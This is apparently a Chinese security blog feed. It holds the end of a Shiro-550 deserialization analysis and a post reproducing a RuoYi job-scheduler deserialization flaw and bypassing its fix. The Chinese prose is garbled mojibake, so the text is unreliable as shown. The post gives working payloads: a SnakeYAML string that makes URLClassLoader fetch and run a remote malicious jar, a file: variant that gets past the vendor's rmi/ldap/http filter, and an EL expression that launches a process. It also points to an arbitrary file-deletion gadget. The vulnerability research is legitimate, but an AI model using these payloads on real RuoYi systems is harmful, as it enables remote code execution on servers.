getRememberedSerializedIdentityÊñπÊ≥ïÂú®AbstractRememberMeManagerÁ±ª‰∏≠ÊòØÊäΩË±°ÊñπÊ≥ïÔºåÂÖ∑‰ΩìÁöÑÂÆûÁé∞‰ª£Á†ÅË¶ÅÂéªÂà∞AbstractRememberMeManagerÁöÑÂ≠êÁ±ªCookieRememberMeManager‰∏≠Áúã„ÄÇÊï¥‰ΩìÂ∞±ÊòØ‰ªéCookie‰∏≠Ëé∑ÂèñrememberMeÂÜÖÂÆπÔºåÂπ∂ËøîÂõûbase64Ëß£Á†ÅÁöÑÂÜÖÂÆπ„ÄÇrememberMeÁöÑÂÜÖÂÆπÊòØÈÄöËøáthis.getCookie()Ëé∑ÂèñÂΩìÂâçÁöÑcookieÂØπË±°ÔºåËÄåcookieÂàùÂßãÂåñÊó∂ÊòØÁî®rememberMeËøô‰∏™ÂêçÁß∞ÁöÑÔºåËé∑ÂèñÂà∞ÁöÑÂÜÖÂÆπÁõ∏Â∫îÁöÑ‰πüËØ•ÂêçÁß∞ÁöÑÂÄº„ÄÇ 1234567891011121314151617181920212223242526protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123; if (!WebUtils.isHttp(subjectContext)) &#123; ... return null; &#125; else &#123; WebSubjectContext wsc = (WebSubjectContext)subjectContext; if (this.isIdentityRemoved(wsc)) &#123; return null; &#125; else &#123; HttpServletRequest request = WebUtils.getHttpRequest(wsc); HttpServletResponse response = WebUtils.getHttpResponse(wsc); String base64 = this.getCookie().readValue(request, response); if ("deleteMe".equals(base64)) &#123; return null; &#125; else if (base64 != null) &#123; base64 = this.ensurePadding(base64); ... byte[] decoded = Base64.decode(base64); ... return decoded; &#125; else &#123; return null; &#125; &#125; &#125;&#125; Ëé∑ÂèñÂà∞Â≠óËäÇÊï∞ÁªÑ‰∏∫ÈùûÁ©∫ÁöÑËØù‰ºöÁªßÁª≠Ë∞ÉÁî®convertBytesToPrincipalsÊñπÊ≥ïÔºåÂú®convertBytesToPrincipalsÊñπÊ≥ï‰∏≠ÂÖàË∞ÉÁî®decryptÊñπÊ≥ïÂØπrememberMeËøõË°åËß£ÂØÜ„ÄÇshiro‰ΩøÁî®ÁöÑÊòØAESÂä†ÂØÜÔºåÊåâÁêÜËØ¥ËøòÂÖ∑ÊúâÂàùÂßãÂåñÂêëÈáèivÔºå‰ΩÜËß£ÂØÜÊó∂ÂÄôÁöÑivÊòØ‰ªérememberMeÁöÑÂºÄÂ§¥Ëé∑ÂèñÁöÑÔºåÊâÄ‰ª•‰∏çÂΩ±ÂìçpayloadÁöÑÊûÑÈÄ†„ÄÇ 1234567891011121314151617181920public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException &#123; byte[] encrypted = ciphertext; byte[] iv = null; if (this.isGenerateInitializationVectors(false)) &#123; try &#123; int ivSize = this.getInitializationVectorSize(); int ivByteSize = ivSize / 8; iv = new byte[ivByteSize]; System.arraycopy(ciphertext, 0, iv, 0, ivByteSize); int encryptedSize = ciphertext.length - ivByteSize; encrypted = new byte[encryptedSize]; System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize); &#125; catch (Exception var8) &#123; String msg = "Unable to correctly extract the Initialization Vector or ciphertext."; throw new CryptoException(msg, var8); &#125; &#125; return this.decrypt(encrypted, key, iv);&#125; Êé•ÁùÄÊòØÂØπËß£ÂØÜÂêéÁöÑÂÜÖÂÆπËøõË°åÂèçÂ∫èÂàóÂåñÔºåÊúÄÁªàË∞ÉÁî®ÊñπÁöÑÊòØDefaultSerializerÁ±ªÁöÑdeserializeÊñπÊ≥ï„ÄÇËøôÈáåÂÆû‰æãÂåñObjectInputStreamÁ±ªÊòØÁî®‰ªñÁöÑÂ≠êÁ±ªClassResolvingObjectInputStreamÊòØÂÆûÁé∞ÁöÑ„ÄÇ ClassResolvingObjectInputStreamÁöÑresolveClassÊñπÊ≥ïÊòØÈÄöËøáforNameÊñπÊ≥ïËøîÂõûClassÂÆû‰æãÁöÑÔºå‰ΩÜforName‰∏çÊîØÊåÅÊï∞ÁªÑÁ±ªÂûãÁöÑClassÔºåÊâÄ‰ª•ÂèçÂ∫èÂàóÂåñÁöÑÂà©Áî®ÈìæÊ≤°‰ΩøÁî®CommonsCollectionsÁöÑÔºåËÄåÊòØÁî®‰∫ÜCommonsBeanutils1„ÄÇÂõ†‰∏∫‰∫ãÂÖàÁúã‰∫ÜÂà´ÁöÑÂ∏àÂÇÖÂ§çÁé∞ÁöÑÊñáÁ´†ÔºåÊâÄ‰ª•Ê≤°ÊúâË∏©Ëøô‰∏™Âùë„ÄÇÂÖ∑‰ΩìÁöÑforNameÂéüÁêÜÂú®@zsxÂ∏àÂÇÖÁöÑÊñáÁ´†ÈáåÊúâËØ¶Â∞ΩÁöÑÂàÜÊûê„ÄÇÈô§Ê≠§‰πãÂ§ñÔºåÂêéÈù¢ÁöÑÂèçÂ∫èÂàóÂåñÂ∞±‰∏éÊôÆÈÄöÁöÑÂèçÂ∫èÂàóÂåñÊó†ÂºÇ„ÄÇ ÂêéËÆ∞CommonsBeanutils1ÈáåÁöÑTemplatesImplÂú®‰∏äÂõûJavaÂèçÂ∫èÂàóÂåñÁöÑÊñáÁ´†ÈáåÊ≤°ÊúâÂ≠¶Âà∞ÔºåÂ•ΩÂÉèfastjson‰∏çÂá∫ÁΩëÁöÑpayloadÊòØÊúâÁî®Âà∞Ëøô‰∏™ÁöÑÔºåÂêéÁª≠ËøòËøòË¶ÅË°•ÂÖÖÂ≠¶‰π†„ÄÇÂÜ≤ÂÜ≤ÂÜ≤ ÂèÇËÄÉhttps://www.cnblogs.com/loong-hon/p/10619616.html https://p2hm1n.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ https://www.mi1k7ea.com/2020/10/03/%E6%B5%85%E6%9E%90Shiro-rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88Shiro550%EF%BC%89/#%E9%83%A8%E5%88%86Gadget%E6%89%93%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%9D%91 http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/#4-%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F https://blog.zsxsoft.com/post/35]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>ÂèçÂ∫èÂàóÂåñ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ëã•‰æùÂèçÂ∫èÂàóÊºèÊ¥ûÂ§çÁé∞ÂèäÂÖ∂‰øÆÂ§çÁªïËøá]]></title>
    <url>%2F2021%2F09%2F04%2F%E8%8B%A5%E4%BE%9D%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂ≠¶ÂÆå‰∫ÜJavaÂèçÂ∫èÂàóÂåñÔºåÂú®CNVD‰∏äÊâæ‰∫Ü‰∏™ÊúâJavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÁ≥ªÁªüÁªÉÁªÉÊâãÔºåÂè´Ëã•‰æùÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂú®github‰∏äÁöÑstarÊï∞‰πü‰∏çÂ∞ë„ÄÇÊàëÊòØÊå∫ÂñúÊ¨¢Ëøô‰∏™ÂêçÂ≠óÁöÑÔºå‰Ω†Ëã•‰∏çÁ¶ª‰∏çÂºÉ„ÄÅÊàëÂøÖÁîüÊ≠ªÁõ∏‰æùÔºåËøô‰∏™ÂØìÊÑèÂèØÊòØ‰ΩúËÄÖÁöÑÂÆòÊñπËß£ËØªÔºå‰∏çÊòØÊàëÁûéÁºñÁöÑ„ÄÇüòÜ ‰ø°ÊÅØÊî∂ÈõÜ‰∏ªË¶ÅÊòØÁúãÁúãÊúâÊ≤°Êúâ‰ª£Á†ÅÂÆ°ËÆ°ÁöÑÊñáÁ´†ÔºåÊêú‰∫Ü‰∏ãÂèëÁé∞Êúâ‰∏ÄÁØáÁÆÄÂçïÂÆ°ËÆ°Ëøô‰∏™ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÊñáÁ´†ÔºåÂú®ÂÆòÁΩë‰∏äËøòÂçÅÂàÜËâØÂøÉÁöÑÁªôÂá∫‰∫ÜÂéÜÂè≤ÊºèÊ¥û„ÄÇÂú®ÂéÜÂè≤ÊºèÊ¥ûÈáåÁªôÂá∫‰∫ÜPocÂíå‰øÆÂ§çÊñπÊ°à„ÄÇ ÂèØ‰ª•ÂàùÊ≠•ÂæóÁü•ÊºèÊ¥ûÂá∫Áé∞Âú®ÂÆöÊó∂‰ªªÂä°ÁöÑSysJobControllerÊéßÂà∂Âô®ÈáåÔºå‰∏â‰∏™POCÁöÑÂâç‰∏§‰∏™ÊòØJNDIÊ≥®ÂÖ•ÔºåÂêé‰∏Ä‰∏™ÊòØyamlÂèçÂ∫èÂàóÂåñ„ÄÇ ÊºèÊ¥ûÂ§çÁé∞ÊºèÊ¥ûÂ§çÁé∞ËøôÈáå‰ΩøÁî®yamlÂèçÂ∫èÂàóÂåñÁöÑpayloadÊù•Â§çÁé∞„ÄÇÂú®github‰∏ä‰∏ãËΩΩyaml-payloadÂπ∂ÁºñËØëÊâìÂåÖÊàêjarÂåÖÔºåÂπ∂‰ΩøÁî®pythonÁöÑSimpleHTTPServerÊ®°ÂùóËµ∑‰∏Ä‰∏™HTTPÊúçÂä°Áî®Êù•‰∏ãËΩΩÊÅ∂ÊÑèjarÂåÖ„ÄÇÁÑ∂ÂêéÔºåÂú®ÂêéÂè∞Á≥ªÁªüÁõëÊéßÁöÑÂÆöÊó∂‰ªªÂä°ÈáåÂä†‰∏ä‰ª•‰∏ã‰∏ÄÊù°‰ªªÂä°„ÄÇ 1org.yaml.snakeyaml.Yaml.load(&apos;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]]]]&apos;) ÁÑ∂ÂêéÔºåIDEAÈáåÂú®RuntimeÁöÑexecÊñπÊ≥ï‰∏ã‰∏™Êñ≠ÁÇπÔºåÂπ∂Âú®Áõ∏Â∫îÂÆöÊó∂‰ªªÂä°ÁöÑÊõ¥Â§öÊìç‰ΩúÈáåÊâßË°å‰∏ÄÊ¨°‰ªªÂä°„ÄÇÂú®Ë∞ÉÁî®Ê†àÈáåÂèØÁúãÂà∞ÔºåÈ°πÁõÆÈáåÁöÑÊñπÊ≥ïË∞ÉÁî®ÊúâÂõõ‰∏™ÔºåÂÖ∂‰ªñ‰∏§ÂùóÁöÑË∞ÉÁî®Ê†àÂàÜÂà´ÊòØquartz‰ªªÂä°Ë∞ÉÂ∫¶Ê°ÜÊû∂ÂíåsnakeyamlÁöÑÊ†à„ÄÇ Ë∑üËøõAbstractQuartzJobÁöÑexecuteÊñπÊ≥ïÔºåËøô‰∏™ÊñπÊ≥ïÊòØÁî±quartz‰ªªÂä°Ë∞ÉÂ∫¶Ê°ÜÊû∂Ë∞ÉÁî®ÁöÑÔºåÁî±quartzÁöÑÊñáÊ°£ÂèØÁü•ÊØè‰∏™ÂÆûÁé∞JobÊé•Âè£ÁöÑÁ±ª‰∏∫‰∏Ä‰∏™‰ªªÂä°ÔºåËøô‰∏™Á±ªËøòÈúÄÈáçÂÜôexecuteÊñπÊ≥ïÊù•ÂÆûÁé∞‰ªªÂä°ÁöÑÊâßË°åÂÜÖÂÆπ„ÄÇÂú®Ëøô‰∏™executeÊñπÊ≥ïÈáåÔºåÂÆÉÂÆû‰æãÂåñ‰∫Ü‰∏Ä‰∏™SysJobÁ±ªÔºåÂπ∂Ë∞ÉÁî®‰∫ÜdoExecuteÊñπÊ≥ï„ÄÇË∞ÉÁî®ÁöÑdoExecuteÊñπÊ≥ïÊòØÂ≠êÁ±ªQuartzDisallowConcurrentExecutionÔºåÂäüËÉΩÂè™ÊòØÂÜçÁªßÁª≠Ë∞ÉÁî®JobInvokeUtilÁöÑinvokeMethodÈùôÊÄÅÊñπÊ≥ï„ÄÇ ÁªßÁª≠Ë∑üËøõÂà∞invokeMethodÊñπÊ≥ïÔºåÊâçÊúâ‰∏Ä‰∫õÂÆûË¥®ÊÄßÁöÑÈÄªËæë‰ª£Á†Å„ÄÇÂºÄÂ§¥Ë∞ÉÁî®ÁõÆÊ†á„ÄÅÁ±ªÂêç„ÄÅÊñπÊ≥ïÂêçÂíåÊñπÊ≥ïÂèÇÊï∞„ÄÇ 123456789101112131415161718public static void invokeMethod(SysJob sysJob) throws Exception&#123; String invokeTarget = sysJob.getInvokeTarget(); String beanName = getBeanName(invokeTarget); String methodName = getMethodName(invokeTarget); List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget); if (!isValidClassName(beanName)) &#123; Object bean = SpringUtils.getBean(beanName); invokeMethod(bean, methodName, methodParams); &#125; else &#123; Object bean = Class.forName(beanName).newInstance(); invokeMethod(bean, methodName, methodParams); &#125;&#125; ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØËé∑ÂèñÊñπÊ≥ïÂèÇÊï∞ËøôÈáåÔºåÂè™ËÉΩËé∑ÂèñString„ÄÅboolen„ÄÅlong„ÄÅdoubleÂíåintÁ±ªÂûãÁöÑÂèÇÊï∞„ÄÇ 1234567891011121314151617181920212223242526272829303132public static List&lt;Object[]&gt; getMethodParams(String invokeTarget)&#123; String methodStr = StringUtils.substringBetween(invokeTarget, "(", ")"); if (StringUtils.isEmpty(methodStr)) &#123; return null; &#125; String[] methodParams = methodStr.split(","); List&lt;Object[]&gt; classs = new LinkedList&lt;&gt;(); for (int i = 0; i &lt; methodParams.length; i++) &#123; String str = StringUtils.trimToEmpty(methodParams[i]); // StringÂ≠óÁ¨¶‰∏≤Á±ªÂûãÔºåÂåÖÂê´' if (StringUtils.contains(str, "'")) &#123; classs.add(new Object[] &#123; StringUtils.replace(str, "'", ""), String.class &#125;); &#125; // booleanÂ∏ÉÂ∞îÁ±ªÂûãÔºåÁ≠â‰∫étrueÊàñËÄÖfalse else if (StringUtils.equals(str, "true") || StringUtils.equalsIgnoreCase(str, "false")) ... // longÈïøÊï¥ÂΩ¢ÔºåÂåÖÂê´L else if (StringUtils.containsIgnoreCase(str, "L")) ... // doubleÊµÆÁÇπÁ±ªÂûãÔºåÂåÖÂê´D else if (StringUtils.containsIgnoreCase(str, "D")) ... // ÂÖ∂‰ªñÁ±ªÂûãÂΩíÁ±ª‰∏∫Êï¥ÂΩ¢ else ... &#125; return classs;&#125; ÂêéÁª≠Ê≠£Â∏∏Á±ªÂêç‰ºöËøõÂÖ•else‰ª£Á†Å‰ΩìÔºåÈÄöËøánewInstanceÊñπÊ≥ïËé∑Âæó‰º†ÂÖ•Á±ªÂêçÁöÑÊó†ÂèÇÊûÑÈÄ†ÊñπÊ≥ïÂÆû‰æãÂåñÁöÑÂØπË±°ÔºåÁÑ∂Âêé‰ΩøÁî®ÂØπË±°„ÄÅÊñπÊ≥ïÂêçÂíåÊñπÊ≥ïÂèÇÊï∞Ë∞ÉÁî®Âè¶‰∏Ä‰∏™ÈáçËΩΩÁöÑinvokeMethodÊñπÊ≥ï„ÄÇËøô‰∏™ÈáçËΩΩÁöÑinvokeMethodÊñπÊ≥ïÂ∞±ÊòØÂÆûÁé∞ÂèçÂ∞ÑË∞ÉÁî®ÊñπÊ≥ïÁöÑÂäüËÉΩÔºåËøôÈáåÂ∞±ÊòØ‰∏çÁªÜËØ¥‰∫Ü„ÄÇËá≥‰∫éPOC‰∏≠JNDIÊ≥®ÂÖ•Ôºå‰∏ä‰∏ÄÁØáÊñáÁ´†ÊúâÂàÜÊûêÔºåËøôÈáå‰πü‰∏çÁªÜËØ¥‰∫ÜÔºåËÄåyamlÊÄé‰πàÂÆûÁé∞ÁöÑÂèçÂ∫èÂàóÂåñÔºåÊú¨Êñá‰πü‰∏çÂ±ïÂºÄÔºåÂú®ÂêéÁª≠ÁöÑÊñáÁ´†‰∏≠ÂÜç‰ªîÁªÜÂàÜÊûê„ÄÇ ÈÄöËøá‰ª•‰∏äÁöÑË∞ÉÁî®Ê†àÁöÑÂàÜÊûêÔºåÂèØÂæóÂá∫‰ª•‰∏ãÊûÑÈÄ†Ëã•‰æùÂèçÂ∫èÂàóÂåñÊºèÊ¥ûpayloadÁöÑÊù°‰ª∂Ôºö ÂÖ•Âè£Á±ªÂè™ÂèØËøõË°å‰∏ÄÊ¨°ÂèçÂ∞ÑË∞ÉÁî® ÂÖ•Âè£Á±ªÈúÄÂèØË¢´ÂÆû‰æãÂåñÔºåÂπ∂ÂÖ∑ÊúâÈªòËÆ§ÁöÑÊó†ÂèÇÊûÑÈÄ†ÊñπÊ≥ï Ë∞ÉÁî®ÁöÑÁ±ªÊñπÊ≥ïÈúÄ‰∏∫Êó†ÂèÇÊàñÂèÇÊï∞‰∏∫String„ÄÅboolen„ÄÅlong„ÄÅdoubleÂíåintÂá†ÁßçÁ±ªÂûã ËøáÊª§‰∏ç‰∏•ÂõûÂà∞ÂÆòÁΩëÔºå‰ΩúËÄÖÁªôÂá∫ÁöÑ‰øÆÂ§çÊñπÊ°àÊòØËøáÊª§rmi„ÄÅldap„ÄÅhttpÂ≠óÁ¨¶‰∏≤ÔºåÂØπÂ∫îÁöÑÊòØ‰ΩúËÄÖÁªôÂá∫ÁöÑ‰∏â‰∏™POC„ÄÇÈÇ£ËøòÊúâÂÖ∂‰ªñÂçèËÆÆÂèØ‰ª•ÂÆûÁé∞ÂèçÂ∫èÂàóÂåñÂêóÔºüÁ≠îÊ°àÊòØËÇØÂÆöÁöÑÔºå ËôΩÁÑ∂ÂÆòÊñπÊñáÊ°£Â•ΩÂÉèÊ≤°ÊúâÁªôÂá∫URLÁ±ªÊîØÊåÅÁöÑÂçèËÆÆÔºå‰ΩÜÂèØ‰ª•‰ΩøÁî®‰ª•‰∏ãÈ™åËØÅÊîØÊåÅÈÇ£ÁßçÂçèËÆÆ„ÄÇ 12345678910111213141516public static void main(String[] args) &#123; String host = "www.baidu.com"; String file = "/index.html"; String[] schames = &#123;"http", "https", "ftp", "mailto", "telnet", "file", "ldap", "gopher", "jdbc", "rmi", "jndi", "jar", "doc", "netdoc", "nfs", "verbatim", "finger", "daytime", "systemresource", "webService", "redis", "zookeeper", "rest", "thrift", "dubbo"&#125;; for (int i = 0; i &lt; schames.length; i++) &#123; try &#123; URL url = new URL(schames[i], host, file); System.out.println("ÊªãÁì∑ " + schames[i] + " ÂçèËÆÆ"); &#125; catch (MalformedURLException e) &#123; System.out.println("‰∏çÊªãÁì∑ " + schames[i] + " ÂçèËÆÆ"); &#125; &#125;&#125; Âú®ÊµãËØïÁªìÊûú‰∏≠‰∏ÄÁúºÂ∞±ËÉΩÁúãÂà∞fileÂçèËÆÆÂíåftpÂçèËÆÆÔºåËøòÊúâ‰∏™jarÂçèËÆÆ‰πüÊòØÂèØ‰ª•‰ΩøÁî®ÁöÑÔºå‰ΩÜËøòÊòØÈúÄË¶ÅÂÄüÂä©ÂÖ∂‰ªñÂçèËÆÆÊâçËÉΩ‰∏ãËΩΩjarÂåÖÔºåÂ∞±Ê≤°ÂøÖË¶ÅÂ§öÊ≠§‰∏Ä‰∏æ‰∫Ü„ÄÇ ftpÂçèËÆÆÁöÑÊºèÊ¥ûÂà©Áî®ÂíåhttpÂçèËÆÆÁöÑÂÖ∂ÂÆûÂ∑Æ‰∏çÂ§öÔºåÊääPOC‰∏≠ÁöÑÂçèËÆÆÊîπ‰∏ÄÊîπÔºåftpÊúçÂä°ÂèØ‰ª•‰ΩøÁî®pythonÁöÑpyftpdlibÊ®°ÂùóÊê≠‰∏Ä‰∏™„ÄÇ fileÂçèËÆÆÁöÑÂà©Áî®ÈúÄË¶ÅÊääjarÂåÖ‰∏ä‰º†Âà∞ÁΩëÁ´ô‰∏äÔºåÈÄöÁü•ÂÖ¨ÂëäÊ®°ÂùóÁöÑÁºñËæëÂô®ÂèØ‰ª•‰∏ä‰º†Êñá‰ª∂ÔºåËôΩÁÑ∂ÊúâÊñá‰ª∂ÂêéÁºÄÁöÑÁôΩÂêçÂçïËøáÊª§Ôºå‰ΩÜÂπ∂‰∏çÂΩ±ÂìçURLÁ±ªÂä†ËΩΩjarÂåÖ„ÄÇ‰∏çËøá‰∏ä‰º†Êñá‰ª∂ËøîÂõûÁöÑË∑ØÂæÑÂπ∂‰∏çÊòØÁΩëÁ´ô‰∏äÁâ©ÁêÜË∑ØÂæÑÔºåÂú®springÁöÑÈÖçÁΩÆÊñá‰ª∂application.yml‰∏≠ÂèØ‰ª•ÁúãÂà∞windowsÁöÑÈªòËÆ§Ë∑ØÂæÑ‰∏∫D:/ruoyi/uploadPathÔºålinuxÁöÑÈªòËÆ§Ë∑ØÂæÑ‰∏∫/home/ruoyi/uploadPath„ÄÇ ÊâÄ‰ª•Áâ©ÁêÜË∑ØÂæÑÊòØD:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txtÔºåÊúÄÂêéÁöÑpayloadÂ¶Ç‰∏ã„ÄÇ 1org.yaml.snakeyaml.Yaml.load(&apos;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;file:/D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt&quot;]]]]&apos;) ‰∏Ä‰∫õÂÖ∂‰ªñÂ∞ùËØïÈô§‰∫ÜËøáÊª§‰∏ç‰∏•ÔºåËøòÊÉ≥Âà∞‰∫Ü‰∏§ÁßçÊûÑÈÄ†payloadÁöÑÊñπÊ≥ïÔºåÂàÜÂà´‰∏∫‰ªé‰æùËµñÂåÖÂíåÈ°πÁõÆ‰∏≠ÂØªÊâæÂêàÈÄÇÁöÑÁ±ªÂíåÊñπÊ≥ï„ÄÇÁî±‰∫éÁ≥ªÁªüÊ°ÜÊû∂ÊòØSpringÁöÑÔºå‰∏ÄÂºÄÂßãÊÉ≥Âà∞ÁöÑÊòØÁî®SpELË°®ËææÂºèÊù•ÂÆûÁé∞ÂëΩ‰ª§ÊâßË°åÔºå‰ΩÜÊòØÂêéÈù¢ËØï‰∫Ü‰∏ãÊâçÁü•ÈÅìparseExpressionÊñπÊ≥ïÁîüÊàêË°®ËææÂºèÂØπË±°ÂêéÔºåËøô‰∏™ÂØπË±°ËøòÂæóË∞ÉÁî®getValueÊñπÊ≥ïÊâç‰ºöËß£ÊûêËøô‰∏™Ë°®ËææÂºè„ÄÇÂêéÈù¢ÈôÜÈôÜÁª≠Áª≠Áúã‰∫Ü‰∫õË¥®ÊñôÔºåÂèëÁé∞ELË°®ËææÂºè‰ºº‰πéÁ¨¶ÂêàËøô‰∏™Á≥ªÁªüÁöÑÂú∫ÊôØ„ÄÇÁÆÄÂçïÁöÑ‰ªãÁªç‰∏ãELË°®ËææÂºèÔºå‰ªñÊòØ‰∏ÄÁßçÂèØÂú®JSPÂíåJSPX‰∏≠‰ΩøÁî®ÁöÑËØ≠Ë®ÄÔºåÂèØÂú®ËÑöÊú¨‰∏≠Ëé∑ÂèñÂèÇÊï∞„ÄÅÊâßË°åËøêÁÆó„ÄÅËé∑ÂèñÂØπË±°ÂíåË∞ÉÁî®ÂáΩÊï∞Á≠â„ÄÇ Âú®Java‰ª£Á†Å‰∏≠ÂèØ‰ª•‰ΩøÁî®ELProcessorÂØπË±°ÁöÑevalËß£ÊûêELË°®ËææÂºèÔºåÁªèËøáÁÆÄÂçïÊûÑÈÄ†ÂèØÂæóÂá∫payloadÂ¶Ç‰∏ãÔºö 1javax.el.ELProcessor.eval(&apos;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[\&apos;(java.lang.String[])\&apos;]([\&apos;cmd\&apos;,\&apos;/c\&apos;,\&apos;calc\&apos;]).start()&quot;)&apos;) ÁÑ∂ËÄå‰∏ÄË∑ëËµ∑Êù•Â∞±ÊäõÂá∫‰∫ÜELExceptionÂºÇÂ∏∏ÔºåË∞ÉËØïË∑üÂà∞ÂèçÂ∞ÑË∞ÉÁî®ÁöÑÂú∞ÊñπÂèëÁé∞ELË°®ËææÂºèÂè™Ââ©‰∏ã&quot;&quot;.getClass(„ÄÇ ÊúÄÂêéÂõûÂéªÊâæÔºåÂ§ßÊÑè‰∫Ü„ÄÇÂú®StringUtilsÂ∑•ÂÖ∑Á±ªÁöÑsubstringBetweenÊñπÊ≥ïÔºå‰πüÂ∞±ÊòØ‰ªñËé∑ÂèñÂèÇÊï∞ÁöÑÊñπÊ≥ï‰∏≠ÂèëÁé∞ÂÆÉÂåπÈÖçÁöÑÂè≥Êã¨Âè∑ÊòØ‰º†ÂÖ•payload‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™Ôºå‰πüÂ∞±ÊòØpayload‰∏≠Ë∞ÉÁî®ÁöÑÊñπÊ≥ï‰∏çËÉΩÂá∫Áé∞Â∑¶Êã¨Âè∑ÔºåÂê¶ÂàôÊó†Ê≥ïËé∑ÂèñÂà∞ÊâÄÊúâÁöÑÂèÇÊï∞„ÄÇ Èô§‰∫Ü‰æùËµñÂåÖ‰∏≠ÁöÑÁ±ªÔºåËøòÊâæ‰∫Ü‰∏ÄÂúàÈ°πÁõÆ‰∏≠ÁöÑÁ±ªÔºåÂèëÁé∞‰∏Ä‰∏™yamlÁöÑÂ∑•ÂÖ∑Á±ªYamlUtilÁöÑloadYamlÊñπÊ≥ïÂèØËÉΩÂêàÈÄÇÔºå‰∫éÊòØÂèàÁÆÄÂçïÁöÑÊûÑÈÄ†‰∫Ü‰∏™payloadÔºö 1com.ruoyi.common.utils.YamlUtil.loadYaml(&apos;D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt&apos;) ËøôÊ¨°ÂàôÊòØÊäõÂá∫‰∫ÜFileNotFoundExceptionÔºåÂõ†‰∏∫getResourceAsStreamÊñπÊ≥ïÊó†Ê≥ïËé∑ÂèñClassPathÂ§ñÁöÑÊñá‰ª∂ÔºåÂÆûÂú®ÊòØÂ≠¶Ëâ∫‰∏çÁ≤æ„ÄÇ ÂêéÁª≠Âú®È°πÁõÆ‰∏≠ËøòÂèëÁé∞‰∫ÜÂè¶‰∏Ä‰∏™ÂèØÂà©Áî®ÁöÑÁÇπÔºåFileUtilsÂ∑•ÂÖ∑Á±ªÁöÑdeleteFileÊñπÊ≥ïÂèØ‰ª•ÂÆûÁé∞‰ªªÊÑèÊñá‰ª∂Âà†Èô§Ôºå‰ΩÜÊú¨ÊñáÁöÑÁõÆÊ†áÊòØgetshellÔºåËÄå‰∏îÂà©Áî®ÊñπÊ≥ï‰πüÂæàÁÆÄÂçïÔºåËøôÈáåÂ∞±‰∏çÂÜçÂÖ∑Ëø∞„ÄÇ ‰øÆÂ§çÂª∫ËÆÆÂÄüÁùÄÊºèÊ¥ûÊù°‰æãÁöÑÈ¢ÅÂ∏ÉÔºåËøôÈáåÁåÆ‰∏äÊú¨‰∫∫ÁöÑ‰øÆÂ§çÂª∫ËÆÆ„ÄÇÂÖ∂ÂÆûÂú®Êàë‰∏ä‰∏Ä‰∏™ÂÆ°ËÆ°ÁöÑÁ≥ªÁªü‰∏≠‰πüÊòØÊúâÂÆöÊó∂‰ªªÂä°ÂäüËÉΩÁöÑÔºå‰πüÊòØÈÄöËøáÂèçÂ∞ÑÁöÑÊñπÂºèË∞ÉÁî®‰ªªÂä°ÁöÑÂÆûÁé∞‰ª£Á†ÅÔºå‰ΩÜÊòØÁî®Êà∑Âè™ËÉΩ‰º†ÂÖ•ÂÆûÁé∞Ëøô‰∏™ÊñπÊ≥ïÁöÑÁ±ªÂêçÔºåÁ≥ªÁªüÂÆû‰æãÂåñËøô‰∏™Á±ªÂπ∂Ë∞ÉÁî®ÁâπÂÆöÁöÑÊñπÊ≥ï„ÄÇ 